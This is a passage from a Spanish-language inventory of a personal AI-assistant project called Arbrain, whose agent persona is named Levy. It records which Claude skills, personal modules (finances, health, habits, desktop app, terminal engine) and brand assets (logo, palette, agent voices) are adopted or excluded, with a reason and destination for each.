| `skill-autoresearch` | adopta | — · global | Auto-optimizar skills con evals binarias (patron Karpathy). Existe en tres copias divergentes (Arbrain, proyecto, global)… | `~/.claude/skills/autoresearch` |
| `skill-bajar-a-tierra` | excluye | — · global | Ritual guiado del programa del autor: bajar la meta a 90 dias a mes, semana y dia desde el expediente de arbrain.ai y «Mi camino» | — |
| `skill-canvas` | excluye (modulo-aparte) | — · global | Oficio del lienzo de diagramas: «TU NO CALCULAS NI UNA COORDENADA», declara nodos y aristas y el compilador decide donde. | — |
| `skill-edicion-por-voz` | excluye | — · global | Editar un video hablando (transcribe, corte limpio, render). Es un ENLACE SIMBOLICO a arbrain/cerebro/manos/edicion-por-voz… | — |
| `skill-goal-compiler` | adopta | — · global | Compilar una intencion ambiciosa en un spec verificable para /goal (loop vs grafo) | `.claude/skills/goal-compiler` |
| `skill-habit-system` | excluye | — · global | Agenda, objetivos de mes/semana/dia, habitos, diario y revisiones del dueño con Todoist y Google, reflejados en now.md. | — |
| `skill-image-generation` | excluye (no-aplica) | — · global | Generar imagenes con GPT Image 2.5 «Sunburst» por OpenRouter (28 lineas + references/sunburst.md) | — |
| `skill-knowledge-search` | excluye | — · global | Buscar en .claude/knowledge/, el conocimiento compilado de las CONVERSACIONES del dueño (captura personal) | — |
| `skill-libro-os` | excluye | — · global | Leer e internalizar libros, PDFs y cursos pagina por pagina para destilar conocimiento persistente del dueño. | — |
| `skill-memory-manager` | adopta | — · global | Memoria persistente curada en archivos (esencia · indice con disparadores · tipos user/project/feedback/reference · nadie borra… | `.claude/skills/memory-manager` |
| `skill-os-audit` | excluye | — · global | Auditar en SOLO LECTURA el cerebro personal (rutas e indices rotos, instrucciones desactualizadas, organos sin resultados) | — |
| `skill-sistema-viable` | adopta | — · global | Modelo de Sistema Viable de Stafford Beer anclado al libro propio del autor. | `~/.claude/skills/sistema-viable` |

### A.5 Solo personales (excluidas) (24)

| pieza | decision | ranura · nivel | motivo | destino propuesto |
|---|---|---|---|---|
| `levy-motor-del-agente` | excluye | — · global | Levy: el agente corre con el Claude Agent SDK (y Codex) en un daemon local con sesion, pool de sesiones… | — |
| `levy-suscripcion-de-claude` | excluye | — · global | Levy con la SUSCRIPCION individual de Claude (`claude auth login --claudeai`) u OpenRouter por su llavero: deteccion de sesion… | — |
| `manos-computer-use` | excluye | — · global | Las «manos»: Levy usa la computadora y la web (observar, actuar, navegar, ventanas, recetas) con su interruptor… | — |
| `tauri-app-de-escritorio` | excluye | — · global | La app de escritorio en Tauri (Rust) para macOS, Windows y Linux: ventanas nativas, llavero, permisos de macOS (TCC)… | — |
| `local-first-y-base-local` | excluye (plataforma) | — · global | Persistencia de UN usuario sin sincronizacion: base local (un JSON por tabla)… | — |
| `motor-de-terminales-sfterm` | excluye | — · global | El motor de terminales: un proceso en Rust que es dueño de las PTY «inmortales» del Studio (protocolo sfterm-ptyd)… | — |
| `captura-de-conversaciones` | excluye | — · global | Captura de conversaciones: texto del dueño y respuesta final… | — |
| `hooks-de-contexto-del-autor` | excluye | — · global | Recall por hook (memory-recall), contexto por intencion (intent-context)… | — |
| `finanzas-del-dueno` | excluye | — · global | Finanzas del negocio del autor (lo cobrado en Polar, lo registrado, runway, cobros fijos) y el estado de Polar. | — |
| `salud-del-dueno` | excluye | — · global | Salud del cuerpo del dueño desde el reloj (Health Auto Export, bandas p25–p75 propias, sueño) y la pantalla «Conecta tu reloj». | — |
| `programa-cohorte-y-90-dias` | excluye | — · global | El programa de la cohorte fundadora: venta y entrega, expediente, «Mi camino» (dia N de 90)… | — |
| `masterclass-del-autor` | excluye | — · global | La masterclass del 17 oct del autor: bloques, linea de tiempo y estado, leida de un JSON del repo del Studio. | — |
| `contenido-youtube-y-comunidad` | excluye | — · global | Contenido (YouTube), radar de competencia, cola de comentarios por aprobar y bandeja de leads del canal del autor. | — |
| `negocio-equipo-y-servidores` | excluye | — · global | El libro del negocio (avatar, oferta, embudo), el organigrama con la socia, el reporte de la mañana, «Lo que llego»… | — |
| `rutinas-y-crons-del-dueno` | excluye | — · global | Las rutinas (crons) del dueño con su catalogo, lapidas y taxonomia, el programador, los registros de operaciones y la actividad. | — |
| `tareas-habitos-y-todoist` | excluye | — · global | Tareas, Kanban, habitos con racha («Atomic Habits»: señal y version de 2 minutos)… | — |
| `biblioteca-y-libros-del-dueno` | excluye | — · global | Biblioteca personal (PDF/EPUB de personal/libros) y su lector. | — |
| `cerebro-cuatro-salas` | excluye | — · global | Las cuatro salas del cerebro artificial (Neuronas: atlas del conocimiento en constelacion 3D; Acciones; Plasticidad… | — |
| `consejo-de-modelos` | excluye | — · global | Consejo: consultar a varios modelos a la vez con su propio motor y almacen. | — |
| `cuentas-de-motor-del-chat` | excluye | — · global | Espacios de cuenta del chat (Claude / Codex) con su preferencia de motor. | — |
| `supabase-del-studio` | excluye | — · global | El esquema Supabase del Studio del autor (semaforo del chat, push_log, avisos, salud, canvas v3, calendario) y sus clientes. | — |
| `studio-del-autor-mission-control` | excluye | — · global | Herencia de ClaudeClaw / Mission Control / OpenClaw: relevo con el Studio, bandeja de salida, ventas… | — |
| `telefono-y-modo-servidor` | excluye | — · global | Modo servidor (`npm run servidor`: supervisor sin Tauri, contraseña de entrada, cookie de sesion… | — |
| `instalador-por-prompt` | excluye | — · global | Instalacion y desinstalacion guiadas por un prompt que corre un agente (INSTALAR.md, GUIA-INSTALACION.md): verifica la firma… | — |

### A.6 Marca (excluidas) (8)

| pieza | decision | ranura · nivel | motivo | destino propuesto |
|---|---|---|---|---|
| `marca-nombre-en-textos-y-metadatos` | excluye | — · producto | El nombre «Arbrain» / «Tu Arbrain» en la interfaz y los metadatos: manifest PWA, pantalla de arranque, titulos… | — |
| `marca-persona-levy` | excluye | — · producto | La persona: «Eres Levy, el socio estrategico del dueño»: tono, reglas de memoria y de freno… | — |
| `marca-cara-de-levy` | excluye | — · producto | La cara de Levy: rig 2D (levy-face), modelo 3D (levy-3d) con visemas y gestos, y la boca sincronizada con la voz. | — |
| `marca-retratos-y-agentes` | excluye | — · producto | Retratos (public/retratos) y los tres agentes del gabinete (Levy, Trinity, Sensei) con su avatar, voz y enfoque… | — |
| `marca-logo-e-iconos` | excluye | — · producto | Logo y monograma «RB» (dos hemisferios), iconos de la app, PWA y escritorio, e imagenes del README. | — |
| `marca-morado-y-oro` | excluye | — · producto | La paleta de marca: morado `--brand` #8C27F1 (acento de la conversacion), `--primary` #683ACC / #8B5CF6, `--neon-purple`… | — |
| `marca-tipografia` | excluye | — · producto | Tipografias de la app (Montserrat, Caveat, JetBrains Mono, Roboto Slab) | — |
| `marca-voces-de-los-agentes` | excluye | — · producto | Voces por agente: ids de voz de ElevenLabs asignados a Levy («Adam»), Trinity y Sensei, firmadas por el dueño. | — |
